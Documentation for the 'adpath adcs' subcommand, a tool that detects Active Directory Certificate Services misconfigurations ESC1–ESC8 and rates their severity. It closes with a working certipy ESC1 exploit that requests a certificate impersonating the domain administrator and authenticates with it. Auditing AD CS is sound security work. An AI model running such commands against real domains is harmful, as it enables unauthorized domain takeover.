# adpath adcs

Analyzes Active Directory Certificate Services for ESC1–ESC8 vulnerabilities.

## Usage

```bash
adpath adcs -d <domain> -u <user> -p <pass> --dc <dc>
```

## Detected vulnerabilities

| ESC | Name | Condition |
|-----|------|-----------|
| ESC1 | Enrollee supplies SAN | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + auth EKU + low-priv enrollment |
| ESC2 | Any purpose | `Any Purpose` EKU or no EKUs |
| ESC3 | Enrollment agent | `Certificate Request Agent` EKU + `msPKI-RA-Signature == 0` |
| ESC4 | Template write access | Low-priv principal has WriteDACL/WriteOwner/GenericAll/GenericWrite on template |
| ESC6 | EDITF flag on CA | `EDITF_ATTRIBUTESUBJECTALTNAME2` set on CA — any template allows SAN |
| ESC7 | CA officer abuse | Low-priv has ManageCA or ManageCertificates on CA object |
| ESC8 | Web enrollment | AD CS web enrollment interface accessible (no HTTP probe, flag only) |

## Severity

- **Critical** — ESC1, ESC2, ESC6 with auth EKU → domain compromise via certificate
- **High** — ESC3, ESC4, ESC7
- **Medium** — ESC8

## Output includes

- CA table (name, DNS, web enrollment indicator)
- Per-template findings with enrolled rights and EKUs
- certipy exploit commands per ESC type

## Example

```bash
adpath adcs -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

```bash
# ESC1 exploit (certipy)
certipy req -u jdoe@corp.local -p 'Password1' -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```
